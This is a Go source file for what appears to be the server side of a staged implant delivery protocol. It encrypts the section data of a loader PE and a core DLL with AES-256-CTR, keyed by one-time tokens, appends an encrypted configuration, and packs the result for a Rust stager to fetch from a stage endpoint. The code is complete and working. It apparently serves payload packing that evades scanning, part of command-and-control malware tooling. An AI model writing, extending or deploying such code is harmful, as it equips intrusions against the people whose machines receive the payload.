// Layered (staged-rs) delivery format — Go side of the contract implemented by
// agent/agent-rs/staged/common/src/lib.rs. Wire layout, byte for byte:
//
//	bundle  = u32le(loaderLen) | loader' | u32le(coreArtLen) | coreArt
//	coreArt = core' | cfgCT | u32le(cfgLen)
//
// `loader'` and `core'` are PE files with one AES-256-CTR keystream XORed over
// the raw data of every section (headers stay clear); `cfgCT` is the encrypted
// config JSON appended at the core DLL tail. Keys are
// SHA-256("sp-<domain>|<stage token>") with the first 16 key bytes as the
// CTR initial counter block (big-endian, matching ctr::Ctr128BE on the Rust
// side). cross-language golden vectors live in staged_test.go / the Rust test
// `golden_vectors_match_go`.
package protocol

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/binary"
	"errors"
)

const (
	DomainLoader = "loader"
	DomainCore   = "core"
	DomainCfg    = "cfg"
	DomainStage  = "stage"
)

// StageDerivedKey returns SHA-256("sp-<domain>|<token>") — the single secret
// every staged artifact is keyed by. Tokens are one-time and short-TTL, so the
// material never exists outside the delivery window.
func StageDerivedKey(domain, token string) []byte {
	k := sha256.Sum256([]byte("sp-" + domain + "|" + token))
	return k[:]
}

// PESectionRanges lists (offset, len) raw-data ranges in section-header order.
// Server and target must walk these identically so both run their keystream
// over the same bytes in the same order.
func PESectionRanges(img []byte) ([][2]int, error) {
	if len(img) < 0x40 {
		return nil, errors.New("not a PE: truncated dos header")
	}
	e := int(binary.LittleEndian.Uint32(img[0x3c:0x40]))
	if e+24 > len(img) || string(img[e:e+4]) != "PE\x00\x00" {
		return nil, errors.New("not a PE: bad signature")
	}
	nsec := int(binary.LittleEndian.Uint16(img[e+6 : e+8]))
	sizeopt := int(binary.LittleEndian.Uint16(img[e+20 : e+22]))
	secs := e + 24 + sizeopt
	if secs+nsec*40 > len(img) {
		return nil, errors.New("not a PE: section table out of bounds")
	}
	var out [][2]int
	for i := 0; i < nsec; i++ {
		s := secs + i*40
		rawLen := int(binary.LittleEndian.Uint32(img[s+16 : s+20]))
		rawOff := int(binary.LittleEndian.Uint32(img[s+20 : s+24]))
		if rawLen == 0 {
			continue
		}
		if rawOff+rawLen > len(img) {
			return nil, errors.New("not a PE: section raw data out of bounds")
		}
		out = append(out, [2]int{rawOff, rawLen})
	}
	return out, nil
}

// EncryptPESections XORs one AES-256-CTR keystream over the section raw data in
// place. XOR is symmetric: the target decrypts with the same call.
func EncryptPESections(img, key []byte) error {
	if len(key) != 32 {
		return errors.New("protocol: staged key must be 32 bytes")
	}
	ranges, err := PESectionRanges(img)
	if err != nil {
		return err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}
	stream := cipher.NewCTR(block, key[:16])
	for _, r := range ranges {
		stream.XORKeyStream(img[r[0]:r[0]+r[1]], img[r[0]:r[0]+r[1]])
	}
	return nil
}

// EncryptCfg is EncryptPESections for the config blob (a single range).
func EncryptCfg(data, key []byte) error {
	if len(key) != 32 {
		return errors.New("protocol: staged key must be 32 bytes")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}
	cipher.NewCTR(block, key[:16]).XORKeyStream(data, data)
	return nil
}

// BuildStagedBundle encrypts loader/core/config under keys derived from token
// and assembles the delivery bundle the Rust stager fetches from the stage endpoint.
func BuildStagedBundle(loader, core, cfgJSON []byte, token string) ([]byte, error) {
	lp := append([]byte(nil), loader...)
	if err := EncryptPESections(lp, StageDerivedKey(DomainLoader, token)); err != nil {
		return nil, err
	}
	cp := append([]byte(nil), core...)
	if err := EncryptPESections(cp, StageDerivedKey(DomainCore, token)); err != nil {
		return nil, err
	}
	ct := append([]byte(nil), cfgJSON...)
	if err := EncryptCfg(ct, StageDerivedKey(DomainCfg, token)); err != nil {
		return nil, err
	}
	coreArt := make([]byte, 0, len(cp)+len(ct)+4)
	coreArt = append(coreArt, cp...)
	coreArt = append(coreArt, ct...)
	coreArt = binary.LittleEndian.AppendUint32(coreArt, uint32(len(ct)))
	out := binary.LittleEndian.AppendUint32(nil, uint32(len(lp)))
	out = append(out, lp...)
	out = binary.LittleEndian.AppendUint32(out, uint32(len(coreArt)))
	return append(out, coreArt...), nil
}
